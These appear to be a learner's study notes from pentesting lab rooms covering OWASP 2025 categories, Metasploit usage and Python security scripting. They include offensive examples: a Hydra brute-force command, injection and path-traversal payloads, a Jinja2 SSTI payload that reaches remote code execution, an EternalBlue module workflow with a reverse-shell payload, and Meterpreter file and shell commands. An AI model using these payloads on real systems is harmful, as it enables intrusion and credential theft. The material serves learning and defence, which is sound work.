  • Linux exploitation is equally viable — Impacket provides the same AD attack capabilities as Windows-native tools, making a Kali attacker machine as effective as a domain-joined Windows machine

docs.title: Task 2 — What is IAAA?
docs.text:
IAAA is the security model that governs how systems control who can do what.

Letter Concept What it means I Identification Who are you? (username, email) A Authentication Prove it (password, MFA, biometric) A Authorisation What are you allowed to do? (roles, permissions) A Accountability What did you do? (logs, audit trail)

Why IAAA matters for pentesting: Every access control vulnerability maps to a failure in one of these four layers. Identifying which layer is broken tells you where to attack and what the business impact is.

docs.title: Task 3 — A01: Broken Access Control
docs.text: OWASP Rank: #1 — most critical web application vulnerability category.

docs.title: What is Broken Access Control?
docs.text:
When a user can perform actions or access resources beyond their intended permissions.

Real-world examples: - Regular user accesses admin panel by navigating to /admin - User views another user's data by changing ?user_id=1 to ?user_id=2 (IDOR) - Unpublished content accessible via direct URL - API returns full data objects when only subset should be visible

docs.title: Attack types under A01
docs.text: Attack How it works Example IDOR (Insecure Direct Object Reference) Change an ID in URL/body to access another user's object GET /invoice?id=1001 → change to id=1002 Forced browsing Navigate directly to restricted URL without going through auth flow Visit /admin/users directly Privilege escalation Perform actions reserved for higher-privilege roles Regular user calls DELETE /api/users/5 Path traversal Navigate outside intended directory ../../etc/passwd Missing function-level access control UI hides admin buttons but API endpoint unprotected Call API directly without going through UI

docs.title: How to find Broken Access Control
docs.text:
1. Log in as a low-privilege user
2. Note all resource IDs visible (user IDs, order IDs, document IDs)
3. Try accessing IDs that don't belong to you
4. Try accessing admin endpoints directly (/admin, /dashboard, /config)
5. Intercept requests in Burp — change role/permission parameters
6. Test horizontal (same role, different user) AND vertical (different role) escalation

docs.title: Prevention
docs.text:
• Deny by default — everything blocked unless explicitly permitted
  • Enforce access control server-side, never client-side
  • Log and alert on access control failures
  • Rate limit API endpoints to reduce automated IDOR testing

docs.title: Task 4 — A07: Authentication Failures
docs.text: OWASP Rank: #7 — previously called "Broken Authentication" in 2017 list.

docs.title: What is Authentication Failure?
docs.text: When the mechanism that verifies user identity can be bypassed, brute-forced, or exploited.

docs.title: Common authentication failures
docs.text: Failure Description Attack Weak passwords No password policy enforced Brute force with rockyou.txt No account lockout Unlimited login attempts allowed Credential stuffing, brute force Credential exposure Passwords in URLs, logs, source code Information disclosure Weak session tokens Predictable or short session IDs Session prediction/hijacking No MFA on sensitive accounts Single factor only Stolen password = full access Insecure "remember me" Long-lived, unrevocable tokens Stolen cookie = persistent access Weak password reset Predictable reset tokens, no expiry Account takeover via reset flow

docs.title: Testing authentication
docs.text:
# Brute force login with Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Username enumeration — different response for valid vs invalid user
# Valid user:   "Incorrect password"
# Invalid user: "User not found"
# → enumerate valid usernames first, then target password

# Check for no lockout — send 100 requests, if no lockout triggered = vulnerable

docs.title: Prevention
docs.text:
• Enforce strong password policy (min 12 chars, complexity)
  • Implement account lockout after 5–10 failed attempts
  • Use MFA on all admin and sensitive accounts
  • Generate cryptographically random session tokens
  • Set session token expiry and invalidate on logout
  • Never expose session tokens in URLs

docs.title: Task 5 — A09: Logging & Alerting Failures
docs.text: OWASP Rank: #9 — previously "Insufficient Logging and Monitoring" in 2017.

docs.title: What is a Logging & Alerting Failure?
docs.text:
When a system fails to record security-relevant events or fails to alert on them in time — allowing attackers to operate undetected.

The core problem: You cannot defend what you cannot see.

docs.title: What should be logged
docs.text: Event Why it matters Failed login attempts Detect brute force Successful logins from new locations Detect account compromise Access control failures (403s) Detect IDOR/forced browsing attempts Input validation failures Detect injection attempts Admin actions Detect privilege abuse Password changes / account modifications Detect account takeover API calls with unusual parameters Detect automated attacks

docs.title: What bad logging looks like
docs.text:
# No logging — attacker brute forces 10,000 passwords, no record exists

# Insufficient logging — login recorded but no failed attempt logging
# Attacker tries 9,999 wrong passwords — no alert fires

# Logged but not monitored — logs exist but no one reviews them
# Attacker has access for 3 months before discovery

docs.title: What good logging looks like
docs.text:
# Structured log entry
{
  "timestamp": "2026-06-15T14:23:01Z",
  "event": "AUTH_FAILURE",
  "user": "admin@company.com",
  "ip": "185.220.101.45",
  "attempt": 47,
  "action": "ACCOUNT_LOCKED"
}

# Alert fired: 10+ failed logins from same IP in 60 seconds → SOC notified

docs.title: Why this matters for SOC roles
docs.text:
A09 is directly relevant to SOC analyst work. Every SIEM tool (Splunk, ELK, Sentinel) is designed to address A09 failures. Learning what should be logged and how to query for it is core SOC analyst skill.

Splunk query to detect brute force: 

index=auth_logs event_type=login_failure
| stats count by src_ip, user
| where count > 10
| sort -count

docs.title: Prevention
docs.text:
• Log all authentication events — success AND failure
  • Log all access control decisions — especially denials
  • Use structured logging (JSON) for machine-readable output
  • Send logs to a centralised SIEM — not local files only
  • Set alerts for suspicious patterns (>10 failures in 60s, login from new country)
  • Protect logs from tampering — write-once storage, separate log server
  • Define and test incident response playbooks

docs.title: IAAA Failures — Combined Attack Scenario
docs.text:
Understanding how A01, A07, and A09 chain together:

Step 1 — A07 failure: No account lockout on login page
         → Attacker brute forces admin password with Hydra

Step 2 — A01 failure: Admin panel accessible to any authenticated user
         → Attacker accesses /admin without admin role check

Step 3 — A01 failure: IDOR on user management API
         → Attacker changes other users' roles: ?user_id=5&role=admin

Step 4 — A09 failure: None of the above was logged or alerted
         → Attacker operates for weeks before discovery (if ever)

This is not a theoretical chain — it is the actual attack pattern in the majority of real data breaches.

docs.title: Key Takeaways
docs.text:
• A01 is #1 for a reason — access control failures are the most common finding in real web application pentests. Every parameter that references a resource is a potential IDOR target
  • A07 failures are preventable at zero cost — account lockout, MFA, and strong passwords cost nothing to implement but eliminate the majority of authentication attacks
  • A09 is what lets attackers stay hidden — a well-configured SIEM running on even basic log sources would catch the majority of real-world attack chains before significant damage occurs
  • IAAA is the lens, not the checklist — when you find a vulnerability, ask: which layer of IAAA failed? That question leads directly to the root cause and the remediation

docs.title: Task 2 — A02: Security Misconfigurations
docs.text:
OWASP Rank: #2 — the most widespread category, covering a huge range of "someone didn't configure this properly" findings.

Common misconfigurations to test:

Misconfiguration Test Finding Default credentials Try admin:admin, admin:password, root:root Authentication bypass Unnecessary features enabled OPTIONS request → PUT/DELETE allowed File upload, resource deletion Verbose error messages Trigger errors → check for stack traces Path/version disclosure Missing security headers curl -I → check for CSP, HSTS, X-Frame-Options XSS, clickjacking, MITM Directory listing Browse directories without index file File enumeration Debug mode enabled Deliberate 404/500 → check response detail Full source paths, config Cloud storage public S3 bucket/Azure blob accessible Data exposure

Security headers checklist (every one missing is a finding): 

Content-Security-Policy
X-Frame-Options
X-Content-Type-Options
Strict-Transport-Security
Referrer-Policy
Permissions-Policy

docs.title: Task 3 — A03: Software Supply Chain Failures
docs.text:
OWASP Rank: #3 — attacking the libraries and dependencies an application uses, rather than the application itself.

How supply chain attacks work: 

1. Attacker compromises a legitimate npm/PyPI/Maven package
2. Application uses that package
3. Malicious code executes within the trusted application context
4. Attacker gains same access as the application itself

Real-world examples: - SolarWinds (2020): Build pipeline compromised → malicious update pushed to 18,000 organisations - Log4Shell (CVE-2021-44228): Vulnerability in Log4j library affected thousands of Java applications - left-pad npm incident: Single package removal broke thousands of apps — dependency fragility

Testing for supply chain vulnerabilities: 

# Check npm packages for known vulnerabilities
npm audit

# Check Python packages
pip-audit
safety check

# Check Java
dependency-check --project myapp --scan .

# Search for outdated packages with CVEs
# Identify package versions → check snyk.io or osv.dev

Finding exposed dependency files: 

/package.json          → Node.js dependencies + versions
/package-lock.json     → Exact locked versions
/requirements.txt      → Python dependencies
/pom.xml               → Java Maven dependencies
/composer.json         → PHP dependencies
/Gemfile               → Ruby dependencies

docs.title: Task 4 — A04: Cryptographic Failures
docs.text:
OWASP Rank: #4 — sensitive data exposed due to weak, missing, or incorrectly implemented encryption.

Common cryptographic failures:

Failure Example Impact Data transmitted in plaintext HTTP instead of HTTPS Credential interception Weak hashing algorithm MD5 or SHA1 for passwords Fast cracking with rainbow tables No salting Same password = same hash Hash comparison attacks Hardcoded keys/secrets SECRET_KEY = "abc123" in source Full compromise Weak cipher suites SSLv3, TLS 1.0, RC4 Decryption of captured traffic Sensitive data in URL /reset?token=abc123 Logged in server/proxy logs Weak random number generation Math.random() for tokens Predictable tokens

Testing for weak crypto: 

# Check TLS configuration
sslscan target.com
testssl.sh target.com
nmap --script ssl-enum-ciphers -p 443 target.com

# Check for weak password hashing (look for short hashes)
# MD5: 32 hex chars
# SHA1: 40 hex chars
# bcrypt: starts with $2b$ — acceptable
# Argon2: starts with $argon2 — good

# Check certificate validity
curl -I https://target.com         # Certificate error? → expired or self-signed

Password storage — good vs bad: 

BAD:  MD5("password") = 5f4dcc3b5aa765d61d8327deb882cf99
BAD:  SHA1("password") = 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
BAD:  SHA256 without salt — same password = same hash always

GOOD: bcrypt($password, cost=12)
GOOD: Argon2id($password, memory=64MB, iterations=3)

docs.title: Task 5 — A06: Insecure Design
docs.text:
OWASP Rank: #6 — vulnerabilities baked into the system architecture and design decisions, not just implementation mistakes.

The key distinction: 

Security Misconfiguration (A02): The developer configured something wrong
Insecure Design (A06):           The fundamental design has no way to be secure

Examples of insecure design:

Design Flaw Why it can't be simply "fixed" Password reset by security questions Questions are guessable/public — no implementation fixes this "Remember me" via predictable cookie Token-based design requires redesign Rate limiting bolted on after the fact If architecture doesn't support it centrally, bypasses are easy Trust user-supplied data for pricing Any implementation that trusts client-side price data is flawed by design Single-factor auth for financial transfers The design needs MFA — patching doesn't fix a design decision

Testing for insecure design: - Business logic testing: can you buy a £100 item for £0 by manipulating cart values? - Can you skip required steps in a workflow (checkout without address, password reset without verification)? - Can you perform actions in the wrong order (pay before adding to cart)? - Are there race conditions in the design (two users both claiming the same coupon simultaneously)?

docs.title: OWASP 2025 Design Flaws — Combined Picture
docs.text:
A02 Security Misconfiguration  → Something was misconfigured (fixable)
A03 Supply Chain Failures      → A dependency was compromised (systemic risk)
A04 Cryptographic Failures     → Data exposed through weak/missing encryption
A06 Insecure Design            → The design itself is the vulnerability (requires redesign)

docs.title: Key Takeaways
docs.text:
• A02 is the most common finding in real pentests — misconfigured servers, default credentials, and missing security headers appear in almost every engagement
  • Supply chain is the fastest-growing attack vector — a single compromised dependency can affect thousands of downstream applications with no code changes required
  • MD5/SHA1 for passwords = automatic Critical finding — these are computationally trivial to crack; bcrypt or Argon2 is the only acceptable alternative
  • A06 requires design review, not just code review — insecure design findings often require the most expensive remediation (architectural changes, not patches)
  • These four categories often chain together — misconfigured server (A02) + plaintext data (A04) + predictable reset token (A06) = complete account takeover

docs.title: Tasks Completed
docs.text: Task OWASP Category Task 1 Introduction Task 2 A04: Cryptographic Failures Task 3 A05: Injection Task 4 A08: Software or Data Integrity Failures

docs.title: Task 2 — A04: Cryptographic Failures
docs.text: OWASP Rank: #4 — sensitive data exposed because it's transmitted or stored without proper encryption, or with weak encryption.

docs.title: Where sensitive data gets exposed
docs.text:
In transit (transmission): 

HTTP instead of HTTPS         → credentials intercepted in plaintext
Weak TLS cipher suites        → encrypted but breakable
No HSTS header               → SSL stripping attack possible
Mixed content                → HTTP resources on HTTPS page

At rest (storage): 

Plaintext passwords in database       → single breach = all passwords exposed
MD5/SHA1 password hashes             → rainbow tables crack instantly
Unencrypted PII in database          → GDPR/data protection violation
Credentials in config files          → exposed via LFI, git, backups
API keys hardcoded in source         → exposed via GitHub, decompilation

In transit within the application: 

Sensitive data in GET parameters  → logged in server/proxy/browser history
?password=abc123&token=xyz        → leaked in Referer header to third parties
Session token in URL              → leaked everywhere a URL appears

docs.title: Testing cryptographic failures
docs.text:
# Check TLS quality
testssl.sh https://target.com
sslscan target.com

# Look for weak hashes in database exposure (SQLi, data breach)
# MD5: 32 hex characters  e.g. 5f4dcc3b5aa765d61d8327deb882cf99
# SHA1: 40 hex characters e.g. 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
# Both crackable immediately with hashcat + rockyou.txt

# Check for sensitive data in URLs
# Proxy through Burp → search HTTP history for tokens in URL parameters

# Check cookie security attributes
# Missing Secure flag = cookie sent over HTTP
# Missing HttpOnly = JavaScript can read the cookie

docs.title: Cryptographic failures in APIs
docs.text:
# Sensitive data in response that shouldn't be there
GET /api/v1/users/5
Response:
{
  "id": 5,
  "username": "alice",
  "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99",  ← MD5, crackable
  "credit_card": "4111111111111111",                      ← PCI violation
  "ssn": "123-45-6789"                                    ← PII exposure
}

docs.title: Task 3 — A05: Injection
docs.text: OWASP Rank: #5 — untrusted data sent to an interpreter as part of a command or query.

docs.title: Injection categories
docs.text: Type Interpreter Classic example SQL Injection SQL database ' OR 1=1-- NoSQL Injection MongoDB, Redis {"$gt": ""} Command Injection OS shell ; whoami LDAP Injection LDAP directory *)(uid=*))(|(uid=* XPath Injection XML database ' or '1'='1 Template Injection (SSTI) Template engines {{7*7}} → 49 HTML Injection Browser rendering <h1>Injected</h1>

docs.title: Server-Side Template Injection (SSTI) — often overlooked
docs.text:
SSTI occurs when user input is embedded directly into a template string that gets evaluated server-side.

# Vulnerable Flask/Jinja2 code
template = "Hello " + request.args.get('name')
return render_template_string(template)

Detection payloads (each templating engine has different syntax): 

{{7*7}}           → if response shows 49 → Jinja2/Twig injection confirmed
${7*7}            → FreeMarker, Velocity
<%= 7*7 %>        → ERB (Ruby)
#{7*7}            → Pebble
*{7*7}            → Thymeleaf

Escalating SSTI to RCE (Jinja2): 

{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

docs.title: LDAP Injection
docs.text:
LDAP directories (Active Directory) are queried with LDAP filter syntax. Unsanitised input breaks the filter.

# Normal LDAP query:
(&(uid=alice)(password=Secret123))

# Injection:
Username: alice)(uid=*))(|(uid=*
# Modified query:
(&(uid=alice)(uid=*))(|(uid=*)(password=anything))
# → Authentication bypassed

Relevance: Active Directory environments (common in Pakistani enterprise) use LDAP for authentication. LDAP injection is a high-value finding in corporate network pentests.

docs.title: Universal injection testing approach
docs.text:
1. Identify every input field, URL parameter, and API parameter
2. Submit a single quote: '
   → Does the response change? Error? Different content? → injection likely
3. Submit injection-specific syntax for the suspected interpreter
4. Confirm with a benign payload (time delay, mathematical operation)
5. Escalate to data extraction or command execution

docs.title: Task 4 — A08: Software or Data Integrity Failures
docs.text: OWASP Rank: #8 — code and infrastructure that doesn't protect against integrity violations.

docs.title: Two subtypes
docs.text:
Software integrity failures: - Applications download updates/plugins without verifying the signature or hash - CI/CD pipelines execute unsigned/unverified code - Deserialisation of untrusted data executes arbitrary code

Data integrity failures: - JWTs and session tokens that can be tampered with (from IAAA room) - Client-side data trusted without server-side validation - Critical business logic enforced only client-side

docs.title: Insecure Deserialisation
docs.text:
Deserialisation converts stored/transmitted data back into an object. If the data can be modified before deserialisation, the reconstructed object can contain malicious logic.

Languages commonly vulnerable: - Java: ObjectInputStream.readObject() - PHP: unserialize() - Python: pickle.loads() - Ruby: Marshal.load()

Testing for deserialisation: 

1. Look for base64-encoded data in cookies or parameters
   rO0AB... → Java serialised object (starts with rO0)
   O:4:"User" → PHP serialised object

2. Decode and examine the structure
3. Modify fields and observe how the application responds
4. Use ysoserial (Java) or phpggc (PHP) to generate malicious payloads

PHP deserialisation example: 

// Serialised user object in cookie
O:4:"User":2:{s:4:"name";s:5:"alice";s:4:"role";s:4:"user";}

// Modified to admin:
O:4:"User":2:{s:4:"name";s:5:"alice";s:4:"role";s:5:"admin";}

docs.title: CI/CD Pipeline Integrity
docs.text:
Attack scenario:
1. Attacker gains write access to a dependency repository
2. Malicious code committed to package
3. CI/CD pipeline pulls the dependency automatically
4. Malicious code executes during build with pipeline permissions
5. Built artifacts distributed to all users of the application

Real-world: SolarWinds attack (2020)

What to check in source code repos: - Are dependency versions pinned exactly? (lodash@4.17.21 not lodash@^4) - Are package hashes verified? (npm install --require-lockfile) - Are CI/CD pipeline configurations (.github/workflows/, Jenkinsfile) protected from external contributions?

docs.title: OWASP 2025 Data Handling — Combined Picture
docs.text:
A04 Cryptographic Failures  → Data exposed in transit or at rest
A05 Injection               → Untrusted data executed by an interpreter
A08 Integrity Failures      → Unsigned/unverified code or data executes

How they chain: 

A04: Login credentials stored as MD5 → cracked easily
→ A05: Attacker logs in → finds SQLi on internal page
→ A08: Internal CI/CD pipeline has no code signing
→ Attacker injects malicious build step → compromises deployment

docs.title: Key Takeaways
docs.text:
• SSTI is underrated — it's less known than SQLi but equally severe, and many developers have never heard of it. Finding {{7*7}} evaluating to 49 in a response is an immediate RCE vector
  • LDAP injection is enterprise-specific — less common in bug bounty but extremely high-value in corporate network pentests where Active Directory is the authentication backbone
  • Insecure deserialisation requires source code context — you need to know the language and serialisation format to craft effective payloads; this is an intermediate skill worth developing further
  • A08 is about trust chains — the question is always "where does this data/code come from, and is its integrity verified at every step?"
  • A04 + A05 together cover the majority of real breach scenarios — weak password storage combined with any injection vulnerability is the textbook path to full database compromise

docs.title: Task 1 — Introduction to the Metasploit Framework
docs.text:
Metasploit is the world's most widely used penetration testing framework. It provides a structured environment for developing, testing, and executing exploits against target systems.

Two editions:

Edition Description Metasploit Framework Free, open-source, command-line (msfconsole) Metasploit Pro Commercial, GUI-based, enterprise features

What Metasploit is used for: - Exploit known vulnerabilities on target systems - Generate and deliver payloads - Post-exploitation — privilege escalation, pivoting, persistence - Auxiliary tasks — scanning, enumeration, fuzzing

Launch Metasploit: 

msfconsole

docs.title: Task 2 — Core Concepts and Module Types
docs.text: Metasploit is built around modules — self-contained units that each perform a specific task.

docs.title: Module Types
docs.text: Module Purpose Example Exploit Takes advantage of a vulnerability to gain access exploit/windows/smb/ms17_010_eternalblue Payload Code executed on the target after exploitation windows/x64/meterpreter/reverse_tcp Auxiliary Scanning, enumeration, fuzzing — no shell auxiliary/scanner/smb/smb_ms17_010 Post Post-exploitation actions on a compromised session post/multi/recon/local_exploit_suggester Encoder Obfuscates payload to evade AV detection encoder/x86/shikata_ga_nai NOP No-operation sleds used in buffer overflow exploits nop/x86/single_byte Evasion Generates AV-evasive payloads evasion/windows/applocker_evasion_msbuild

docs.title: Payload Types
docs.text:
Type How it works Singles Self-contained — execute and done (e.g. add a user) Stagers Small payload that establishes connection, then downloads stage Stages Downloaded by stager — full featured (e.g. Meterpreter)

Naming convention: 

windows/x64/meterpreter/reverse_tcp
  │       │       │           │
  OS    arch   payload    connection type

  • / in name = staged payload
  • _ in name = stageless payload (e.g. meterpreter_reverse_tcp)

docs.title: Essential commands
docs.text:
# Help and navigation
help                          # Show all commands
help <command>                # Help for specific command
exit                          # Quit msfconsole

# Searching for modules
search <keyword>              # Search by name, CVE, platform
search type:exploit platform:windows smb
search cve:2017-0144          # Search by CVE number

# Using a module
use <module_path>             # Load a module
use exploit/windows/smb/ms17_010_eternalblue
use 0                         # Use by search result number

# Module information
info                          # Full module details
show options                  # Required and optional parameters
show payloads                 # Compatible payloads for this exploit
show targets                  # Supported target versions

# Navigation
back                          # Exit current module
previous                      # Return to last used module

docs.title: Searching effectively
docs.text:
search eternalblue            # By name
search ms17-010               # By Microsoft bulletin
search type:auxiliary scanner  # By type + keyword
search platform:linux rank:excellent  # By platform + reliability rank

Module rank indicates reliability:

Rank Meaning Excellent No side effects, reliable Great Has default target, auto-detection Good Common platform default Normal Doesn't meet above but works Average Difficult to exploit reliably Low Near 50% success rate Manual Requires manual steps

docs.title: Standard workflow
docs.text:
# 1. Find and load the module
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue

# 2. View required options
show options

# 3. Set required parameters
set RHOSTS 10.10.10.1         # Target IP
set RPORT 445                 # Target port (often pre-set)
set LHOST 10.10.14.5          # Your IP (for reverse shells)
set LPORT 4444                # Your listening port

# 4. Set payload
set payload windows/x64/meterpreter/reverse_tcp

# 5. Verify configuration
show options                  # Confirm everything is set

# 6. Run
run                           # Execute the module
exploit                       # Alternative to run

docs.title: Global vs module options
docs.text:
setg LHOST 10.10.14.5         # Set globally — persists across modules
setg RHOSTS 10.10.10.1        # Useful when testing multiple modules on same target
unset LHOST                   # Clear a single option
unsetg LHOST                  # Clear global option

docs.title: Useful options
docs.text:
set VERBOSE true              # Show detailed output
set ConnectTimeout 10         # Adjust connection timeout
check                         # Check if target is vulnerable (if module supports it)

docs.title: Task 5 — Managing Sessions
docs.text: After successful exploitation, Metasploit opens a session — an active connection to the compromised target.

docs.title: Session commands
docs.text:
# From within msfconsole
sessions                      # List all active sessions
sessions -l                   # Same as above (list)
sessions -i 1                 # Interact with session 1
sessions -k 1                 # Kill session 1
sessions -K                   # Kill all sessions
sessions -u 1                 # Upgrade shell session to Meterpreter

docs.title: Meterpreter basics
docs.text:
Meterpreter is Metasploit's advanced post-exploitation payload. It runs entirely in memory — no files written to disk.

# Once inside a Meterpreter session
sysinfo                       # Target OS, hostname, architecture
getuid                        # Current user
getpid                        # Current process ID
pwd                           # Current directory on target
ls                            # List files
download file.txt             # Download file from target
upload shell.exe              # Upload file to target
shell                         # Drop into OS shell
background                    # Send session to background (back to msfconsole)
exit                          # Close session

docs.title: Background and resume
docs.text:
# Inside Meterpreter — background the session
background                    # or Ctrl+Z

# Back in msfconsole

docs.title: Key Takeaways
docs.text:
• Metasploit organises everything into modules — once you understand the module types (exploit, payload, auxiliary, post), the framework becomes intuitive
  • search is your most important command — you will never memorise all module paths; searching by CVE, name, or platform is how professionals use Metasploit
  • Staged vs stageless payloads matter — use staged (/) when you need full Meterpreter features; use stageless (_) when reliability matters more than features
  • Meterpreter runs in memory — no file written to disk means it evades many AV solutions and leaves fewer forensic artefacts
  • background and sessions -i are fundamental — real engagements involve juggling multiple sessions across multiple targets; learn to manage them from the start
  • Always use check before running an exploit — blind exploitation wastes time and creates noise; verify vulnerability first when the module supports it

docs.title: Task 2 — Variables
docs.text:
Variables store data that the script can reference and manipulate.

# Basic variable types used in security scripts
target_ip = "10.10.10.1"          # string — target address
port = 80                          # integer — port number
is_open = False                    # boolean — port state
timeout = 2.5                      # float — connection timeout

# Type checking
print(type(target_ip))             # <class 'str'>
print(type(port))                  # <class 'int'>

# String formatting — essential for building dynamic commands/URLs
url = f"http://{target_ip}:{port}/admin"
print(url)                         # http://10.10.10.1:80/admin

Why this matters for security scripting: Every tool you build — port scanners, subdomain finders, brute forcers — uses variables to hold target IPs, ports, wordlists, and results. Getting comfortable with f-strings is particularly important since URL and command construction relies on them constantly.

docs.title: Task 3 — Conditional Statements
docs.text:
Conditionals make scripts respond differently based on what they find.

response_code = 200

if response_code == 200:
    print("Page found — potential target")
elif response_code == 403:
    print("Forbidden — exists but restricted")
elif response_code == 404:
    print("Not found")
else:
    print(f"Unexpected response: {response_code}")

Security scripting application: 

port = 22
is_open = True

if is_open and port == 22:
    print("SSH is open — attempt key auth or brute force")
elif is_open and port == 80:
    print("HTTP open — begin web enumeration")

docs.title: Task 4 — Iterations
docs.text:
Loops let scripts repeat actions across lists of targets, ports, or wordlist entries.

# Loop through a list of ports to scan
ports = [21, 22, 80, 443, 3306, 8080]

for port in ports:
    print(f"Scanning port {port}...")

# Loop through a wordlist
wordlist = ["admin", "login", "dashboard", "backup", "config"]

for path in wordlist:
    url = f"http://10.10.10.1/{path}"
    print(f"Testing: {url}")

# While loop — retry until condition met
attempts = 0
max_attempts = 3

while attempts < max_attempts:
    print(f"Attempt {attempts + 1}")
    attempts += 1

Why iterations are the core of security scripting: A port scanner loops through ports. A subdomain finder loops through a wordlist. A brute forcer loops through passwords. Every security tool at its core is a loop doing something to each item in a list.

docs.text:

  • f-strings make URL and command building clean — f"http://{ip}:{port}/{path}" is the pattern used in almost every web security script
  • Python's readability makes it the dominant language for security tooling — most tools in the field (Impacket, sqlmap, Metasploit modules) are Python

Strings are everywhere in security scripting — URLs, payloads, responses, file paths.

target = "http://10.10.10.1/login?user=admin"

docs.text:

  • Dictionaries for results — store findings as {port: service} or {url: status_code} for easy filtering and output
  • enumerate() for progress — always show the user what number out of total the script is on — security tools often run for minutes against large wordlists

docs.title: Task 2 — Functions
docs.text:
Functions make scripts reusable, readable, and testable — essential for any tool beyond a few lines.

# Basic function structure
def scan_port(ip, port, timeout=2):
    """Check if a port is open on the given IP."""
    import socket
    try:
        sock = socket.socket()
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0   # True if open
    except Exception:
        return False

# Call the function
if scan_port("10.10.10.1", 80):
    print("Port 80 is open")

# Function with multiple return values
def check_response(url):
    import requests
    r = requests.get(url, timeout=3)
    return r.status_code, len(r.content)

code, size = check_response("http://target.thm/admin")
print(f"Status: {code}, Size: {size} bytes")

Why functions matter in security scripting: Without functions, a port scanner that checks 1000 ports would repeat the same connection logic 1000 times. A function wraps the logic once — the loop just calls it. This also makes it easy to test individual components and reuse code across multiple tools.

docs.title: Task 3 — Error Handling
docs.text:
Security tools connect to live systems that may be slow, unreachable, or actively blocking. Error handling prevents scripts from crashing on the first failure.

import socket
import requests

# try/except — the core pattern
def safe_request(url):
    try:
        r = requests.get(url, timeout=3)
        return r.status_code
    except requests.exceptions.ConnectionError:
        return None    # host unreachable
    except requests.exceptions.Timeout:
        return None    # timed out
    except Exception as e:
        print(f"Unexpected error: {e}")
        return None

# Multiple exception types
def connect_port(ip, port):
    try:
        sock = socket.socket()
        sock.settimeout(2)
        sock.connect((ip, port))
        banner = sock.recv(1024).decode("utf-8", errors="ignore")
        sock.close()
        return banner
    except socket.timeout:
        return None    # port filtered
    except ConnectionRefusedError:
        return None    # port closed
    except Exception:
        return None

# finally — always runs, even if exception occurs
def scan_with_cleanup(ip, port):
    sock = None
    try:
        sock = socket.socket()
        sock.connect((ip, port))
        return True
    except:
        return False
    finally:
        if sock:
            sock.close()   # always close the socket

Why this matters: A port scanner hitting 1000 ports will encounter timeouts, refused connections, and unreachable hosts on every run. Without try/except, the script crashes on the first failure. With it, the script logs the failure and continues to the next target.

docs.title: Task 4 — Reading and Writing Files
docs.text:
File I/O is how security scripts consume wordlists and save results.

# Reading a wordlist — the standard pattern
def load_wordlist(filepath):
    with open(filepath, "r") as f:
        return [line.strip() for line in f if line.strip()]

wordlist = load_wordlist("/usr/share/wordlists/rockyou.txt")

# Writing scan results to file
def save_results(filename, results):
    with open(filename, "w") as f:
        for item in results:
            f.write(item + "\n")

# Appending to an existing file (for ongoing scans)
with open("found_paths.txt", "a") as f:
    f.write("/admin\n")

# Reading/writing JSON — useful for structured results
import json

results = {
    "target": "10.10.10.1",
    "open_ports": [22, 80, 443],
    "findings": ["SQLi on /login", "RCE via /upload"]
}

with open("scan_results.json", "w") as f:
    json.dump(results, f, indent=2)

# Read it back
with open("scan_results.json", "r") as f:
    data = json.load(f)
    print(data["open_ports"])

Security scripting pattern: Every tool follows the same file pattern — load_wordlist() at the start, save_results() at the end, and logging discovered items with append mode during the scan so nothing is lost if the script is interrupted.

docs.title: Task 6 — Password Strength Checker (Putting It All Together)
docs.text:
Built a complete tool combining all concepts: functions, error handling, file I/O, and string analysis.

import re

def check_password_strength(password):
    score = 0
    feedback = []

    if len(password) >= 12:
        score += 1
    else:
        feedback.append("Use at least 12 characters")

    if re.search(r"[A-Z]", password):
        score += 1
    else:
        feedback.append("Add uppercase letters")

    if re.search(r"[a-z]", password):
        score += 1
    else:
        feedback.append("Add lowercase letters")

    if re.search(r"\d", password):
        score += 1
    else:
        feedback.append("Add numbers")

    if re.search(r"[!@#$%^&*(),.?\":{}|<>]", password):
        score += 1
    else:
        feedback.append("Add special characters")

    ratings = {5: "Strong", 4: "Good", 3: "Moderate", 2: "Weak", 1: "Very weak"}
    rating = ratings.get(score, "Very weak")

    return rating, feedback

# Test it
password = "MyP@ssw0rd2026!"
rating, tips = check_password_strength(password)
print(f"Rating: {rating}")
for tip in tips:
    print(f"  - {tip}")

docs.text:

  • try/except on every network operation — security tools connect to live, unreliable systems; defensive error handling is not optional
  • with open() for all file operations — automatically handles closing the file even if an error occurs
  • argparse makes tools professional — a tool that accepts command-line arguments is immediately more useful and more impressive in a portfolio than a script with hardcoded values
